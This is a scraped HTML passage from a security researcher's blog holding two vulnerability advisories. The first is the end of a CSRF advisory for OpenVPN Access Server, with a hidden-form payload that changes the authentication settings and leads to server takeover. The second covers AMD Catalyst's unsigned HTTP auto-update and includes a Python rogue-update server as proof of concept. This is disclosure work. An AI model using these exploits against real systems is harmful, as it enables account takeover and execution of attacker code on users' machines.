			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/authentication_general_configuration" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="button" value="Update&amp;#32;Running&amp;#32;Server" /&gt;
  &lt;input type="hidden" name="auth&amp;#46;module&amp;#46;type" value="local" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717a6d8465380388-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6d8465380388-2">2</div><div class="crayon-num" data-line="crayon-53c987717a6d8465380388-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717a6d8465380388-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717a6d8465380388-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/authentication_general_configuration"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6d8465380388-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Update&amp;#32;Running&amp;#32;Server"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c987717a6d8465380388-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"auth&amp;#46;module&amp;#46;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"local"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717a6d8465380388-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->
<p>If we do a CSRF attack against a target using these 3 requests(Which can be done with the method described in my post about <a title="Two-stage CSRF attacks" href="http://ceriksen.com/2012/09/29/two-stage-csrf-attacks/">multi-stage CSRF attacks</a>), we can then authenticate to the OpenVPN AS admin interface using the account details csrfaccount/qweasd. This further allows us to take over the server.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>, <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/csrf/" rel="tag">CSRF</a>, <a href="http://ceriksen.com/tag/openvpn/" rel="tag">OpenVPN</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/#respond" title="Comment on CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-256 -->

				
					
<article id="post-228" class="post-228 post type-post status-publish format-standard hentry category-advisories tag-amd">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/" title="2:09 pm" rel="bookmark" class="entry-date"><time datetime="2013-03-17T14:09:23+00:00" pubdate>March 17, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/" title="Permalink to AMD Catalyst driver update vulnerability" rel="bookmark">AMD Catalyst driver update vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Description of vulnerability</strong></p>
<p>The AMD Catalyst driver auto update feature enables users to automatically update the AMD Catalyst driver on their machine through a single click when the driver determines that it is out of date.</p>
<p>However a vulnerability exists in this mechanism as a result of:</p>
<ol>
<li>The download URL and binary download is done over HTTP</li>
<li>The binary is not verified as having been signed by AMD before execution</li>
</ol>
<p>This means that a MITM can intercept the requests to the AMD support site and redirect the auto-update feature to download and execute a binary of the attacker&#8217;s choice without the user knowing any better when they decide to auto-update.</p>
<p><strong>Proof of concept</strong></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717b098123824722" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Python</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import SimpleHTTPServer
import SocketServer

xml = """&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;list&gt;
    &lt;Catalyst-Driver-Files&gt;
        &lt;Title&gt;Catalyst Software Suite with .NET 4 Support&lt;/Title&gt;
        &lt;DriverCategory&gt;Full Catalyst Software Suite (Recommended)&lt;/DriverCategory&gt;
        &lt;DriverLanguage&gt;;#All;#&lt;/DriverLanguage&gt;
        &lt;DriverProductType&gt;;#1-Radeon;#3-Integrated;#18-AIW_HD;#&lt;/DriverProductType&gt;
        &lt;FileSize&gt;184 MB&lt;/FileSize&gt;
        &lt;OSType&gt;;#Windows Vista - 64-Bit Edition;#Windows 7 - 64-Bit Edition;#&lt;/OSType&gt;
        &lt;ReleaseDate&gt;2012-10-22T00:00:00-05:00&lt;/ReleaseDate&gt;
        &lt;RevisionNumber&gt;12.42&lt;/RevisionNumber&gt;
        &lt;RollupSortOrder&gt;15&lt;/RollupSortOrder&gt;
        &lt;TextMultiple1&gt;
        &lt;/TextMultiple1&gt;
        &lt;TextSingle1&gt;http://www2.ati.com/drivers/12-10_vista_win7_win8_64_dd_ccc_whql_net4.exe&lt;/TextSingle1&gt;
        &lt;TechDownloadGPUSubtype&gt;Driver&lt;/TechDownloadGPUSubtype&gt;
        &lt;ContentType&gt;GraphicsDriverFile&lt;/ContentType&gt;
        &lt;DriverVersionSupported&gt;;#12.42;#&lt;/DriverVersionSupported&gt;
        &lt;ID&gt;956&lt;/ID&gt;
        &lt;Modified&gt;2012-10-22T21:30:52-05:00&lt;/Modified&gt;
        &lt;Created&gt;2012-10-22T21:30:52-05:00&lt;/Created&gt;
        &lt;Author&gt;System Account&lt;/Author&gt;
        &lt;Editor&gt;System Account&lt;/Editor&gt;
        &lt;_UIVersionString&gt;1.0&lt;/_UIVersionString&gt;
        &lt;Attachments&gt;0&lt;/Attachments&gt;
        &lt;TitleCN&gt;Catalyst Software Suite&lt;/TitleCN&gt;
        &lt;TitleBR&gt;Catalyst Software Suite&lt;/TitleBR&gt;
        &lt;TitleDE&gt;Catalyst Software Suite&lt;/TitleDE&gt;
        &lt;TitleFR&gt;Catalyst Software Suite&lt;/TitleFR&gt;
        &lt;TitleIT&gt;Catalyst Software Suite&lt;/TitleIT&gt;
        &lt;TitleLA&gt;Catalyst Software Suite&lt;/TitleLA&gt;
        &lt;DescriptionCN&gt;
        &lt;/DescriptionCN&gt;
        &lt;DescriptionBR&gt;
        &lt;/DescriptionBR&gt;
        &lt;DescriptionDE&gt;
        &lt;/DescriptionDE&gt;
        &lt;DescriptionFR&gt;
        &lt;/DescriptionFR&gt;
        &lt;DescriptionIT&gt;
        &lt;/DescriptionIT&gt;
        &lt;DescriptionLA&gt;
        &lt;/DescriptionLA&gt;
        &lt;TitleKR&gt;(Catalyst Software Suite)&lt;/TitleKR&gt;
        &lt;DescriptionKR&gt;
        &lt;/DescriptionKR&gt;
        &lt;LinkTitleNoMenu&gt;Catalyst Software Suite with .NET 4 Support&lt;/LinkTitleNoMenu&gt;
        &lt;LinkTitle&gt;Catalyst Software Suite with .NET 4 Support&lt;/LinkTitle&gt;
    &lt;/Catalyst-Driver-Files&gt;
&lt;/list&gt;
"""

class ExploitHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        if "catalystxml" in self.path:
            self.send_response(200)
            self.send_header('Content-type','text/xml')
            self.end_headers()
            self.wfile.write(xml) 
            return
        elif ".exe" in self.path:
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            f = open(r"C:\Windows\System32\calc.exe", "rb")
            self.wfile.write(f.read())
            f.close()
            return

httpd = SocketServer.ThreadingTCPServer(('0.0.0.0', 80), ExploitHandler)
httpd.serve_forever()</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717b098123824722-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-2">2</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-4">4</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-6">6</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-8">8</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-10">10</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-12">12</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-14">14</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-16">16</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-18">18</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-20">20</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-22">22</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-24">24</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-26">26</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-28">28</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-30">30</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-32">32</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-34">34</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-36">36</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-38">38</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-40">40</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-42">42</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-44">44</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-46">46</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-48">48</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-50">50</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-52">52</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-54">54</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-56">56</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-58">58</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-60">60</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-62">62</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-64">64</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-66">66</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-68">68</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-70">70</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-72">72</div><div class="crayon-num" data-line="crayon-53c987717b098123824722-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717b098123824722-74">74</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717b098123824722-1"><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-k ">SimpleHTTPServer</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-2"><span class="crayon-r">import</span><span class="crayon-h"> </span><span class="crayon-k ">SocketServer</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-4"><span class="crayon-k ">xml</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"""<span class="crayon-ta">&lt;?</span><span class="crayon-e">xml </span><span class="crayon-i">version</span><span class="crayon-o">=</span><span class="crayon-s">"1.0"</span><span class="crayon-h"> </span><span class="crayon-i">encoding</span><span class="crayon-o">=</span><span class="crayon-s">"utf-8"</span><span class="crayon-ta">?&gt;</span></span></div><div class="crayon-line" id="crayon-53c987717b098123824722-5"><span class="crayon-s">&lt;list&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-6"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&lt;Catalyst-Driver-Files&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-7"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Title&gt;Catalyst Software Suite with .NET 4 Support&lt;/Title&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-8"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DriverCategory&gt;Full Catalyst Software Suite (Recommended)&lt;/DriverCategory&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-9"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DriverLanguage&gt;;#All;#&lt;/DriverLanguage&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-10"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DriverProductType&gt;;#1-Radeon;#3-Integrated;#18-AIW_HD;#&lt;/DriverProductType&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-11"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;FileSize&gt;184 MB&lt;/FileSize&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-12"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;OSType&gt;;#Windows Vista - 64-Bit Edition;#Windows 7 - 64-Bit Edition;#&lt;/OSType&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ReleaseDate&gt;2012-10-22T00:00:00-05:00&lt;/ReleaseDate&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-14"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;RevisionNumber&gt;12.42&lt;/RevisionNumber&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;RollupSortOrder&gt;15&lt;/RollupSortOrder&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TextMultiple1&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/TextMultiple1&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TextSingle1&gt;http://www2.ati.com/drivers/12-10_vista_win7_win8_64_dd_ccc_whql_net4.exe&lt;/TextSingle1&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-19"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TechDownloadGPUSubtype&gt;Driver&lt;/TechDownloadGPUSubtype&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ContentType&gt;GraphicsDriverFile&lt;/ContentType&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-21"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DriverVersionSupported&gt;;#12.42;#&lt;/DriverVersionSupported&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ID&gt;956&lt;/ID&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Modified&gt;2012-10-22T21:30:52-05:00&lt;/Modified&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Created&gt;2012-10-22T21:30:52-05:00&lt;/Created&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Author&gt;System Account&lt;/Author&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Editor&gt;System Account&lt;/Editor&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-27"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;_UIVersionString&gt;1.0&lt;/_UIVersionString&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-28"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Attachments&gt;0&lt;/Attachments&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-29"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleCN&gt;Catalyst Software Suite&lt;/TitleCN&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-30"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleBR&gt;Catalyst Software Suite&lt;/TitleBR&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-31"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleDE&gt;Catalyst Software Suite&lt;/TitleDE&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-32"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleFR&gt;Catalyst Software Suite&lt;/TitleFR&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-33"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleIT&gt;Catalyst Software Suite&lt;/TitleIT&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-34"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleLA&gt;Catalyst Software Suite&lt;/TitleLA&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-35"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionCN&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-36"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionCN&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-37"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionBR&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-38"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionBR&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-39"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionDE&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-40"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionDE&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-41"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionFR&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-42"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionFR&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-43"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionIT&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-44"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionIT&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-45"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionLA&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-46"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionLA&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-47"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;TitleKR&gt;(Catalyst Software Suite)&lt;/TitleKR&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-48"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DescriptionKR&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-49"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DescriptionKR&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-50"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;LinkTitleNoMenu&gt;Catalyst Software Suite with .NET 4 Support&lt;/LinkTitleNoMenu&gt;</span></div><div class="crayon-line" id="crayon-53c987717b098123824722-51"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;LinkTitle&gt;Catalyst Software Suite with .NET 4 Support&lt;/LinkTitle&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717b098123824722-52"><span 